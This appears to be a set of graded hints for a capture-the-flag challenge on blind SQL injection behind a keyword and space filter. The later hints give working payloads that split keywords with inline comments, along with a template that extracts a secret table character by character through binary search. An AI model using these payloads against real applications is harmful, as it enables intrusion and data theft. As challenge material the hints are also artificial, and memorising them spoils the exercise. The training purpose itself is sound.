hints.title: Nudge
hints.content: Spaces and common keywords are blocked, but there are always alternative ways to write SQL. MySQL has many syntax quirks that can help.

hints.title: Direction
hints.content: Replace spaces with /**/ (inline comments). The filter blocks exact keyword matches, so UN/**/ION and SEL/**/ECT bypass it. But since this is blind, you don't need UNION — focus on boolean conditions.

hints.title: Approach
hints.content: For spaces use /**/. For comments use ;%00 (null byte) or build conditions without needing comment termination. Test: ABC'/**/||/**/'1'='1 — if 'valid', the OR condition works. Then use ASCII(SUBSTR(...)) for extraction.

hints.title: Near-solution
hints.content: Payload template (URL-encoded): code=ABC'/**/||/**/ASCII(SUBSTR((SEL/**/ECT/**/secret/**/FR/**/OM/**/promo_secrets/**/LIMIT/**/1),{pos},1))>{mid}/**/||/**/'1'='2  This creates: WHERE code='ABC' || ASCII(SUBSTR((SELECT...),pos,1))>mid || '1'='2'. True if char > mid.

hints.title: Solution
hints.content: Script approach: For each position N (1 to flag_length), binary search ASCII value (32-126). Request: /validate?code=ABC'/**/||/**/ASCII(SUBSTR((SEL/**/ECT/**/secret/**/FR/**/OM/**/promo_secrets/**/LIMIT/**/1),{N},1))>{mid}/**/||/**/'1'='2  If response contains 'valid' -> char ASCII > mid (search upper half). If 'invalid' -> char ASCII <= mid (search lower half). /**/ replaces all spaces. SEL/**/ECT and FR/**/OM bypass the keyword filter. First find length: ASCII(SUBSTR(...)=0 means past end of string.
